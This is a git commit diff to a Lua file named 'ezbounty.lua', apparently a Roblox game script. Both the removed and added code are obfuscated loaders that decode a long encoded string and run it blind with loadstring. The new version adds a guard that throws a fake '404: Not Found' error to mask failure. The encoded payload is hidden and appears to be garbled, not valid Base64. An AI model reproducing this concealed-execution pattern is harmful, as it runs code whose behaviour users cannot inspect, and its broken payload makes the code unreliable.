9bc7f26790b577a0d8bd0c8e90b56295aa31e4da
nkahz <khanhkhanhok33@gmail.com>
2026-01-03 00:45:01 +0700

    Update ezbounty.lua

--- ezbounty.lua
+++ ezbounty.lua
@@ -1,6 +1,7 @@
-local _0x1a="ywgqo dqmgr yhbuc muqyw aehqx jzdhb mhasv gosui xfacl fnyqw grahy nwdwa scvvc bxcro smpfo ksayh rvrmu jdzeg urajv tmezf tmcqr nrnxa nylwh znwji fjthp hadms fzaue iljbh hqhpb pcswm jtxtm jggwr lwmsw njpqi zdwra upyjb xqhvd darhb amsgo hsavo mnxnq pvfac fovua uzgcv rnbod tcaov vptxe ohypn rbdme sllmd zatrx zirla wrgtd vrkwl yrcid oyjtf xtbyv qkfvo sceua znzko vbrcj tudfu tujmg dfjys bypvq kfjco itpuq skmyo njfgj gdazt lylmp t"
-local _0x2=game:GetService("HttpService")
-local function _0x3(_0x4)
-    return _0x2:Base64Decode(_0x4)
+if not game or not pcall(function() return game:GetService end) then
+    error("404: Not Found")
 end
-loadstring(_0x3(_0x1a))()
+
+local _="ywgqo dqmgr yhbuc muqyw aehqx jzdhb mhasv gosui xfacl fnyqw grahy nwdwa scvvc bxcro smpfo ksayh rvrmu jdzeg urajv tmezf tmcqr nrnxa nylwh znwji fjthp hadms fzaue iljbh hqhpb pcswm jtxtm jggwr lwmsw njpqi zdwra upyjb xqhvd darhb amsgo hsavo mnxnq pvfac fovua uzgcv rnbod tcaov vptxe ohypn rbdme sllmd zatrx zirla wrgtd vrkwl yrcid oyjtf xtbyv qkfvo sceua znzko vbrcj tudfu tujmg dfjys bypvq kfjco itpuq skmyo njfgj gdazt lylmp t"
+local s=game:GetService("HttpService")
+loadstring(s:Base64Decode(_))()
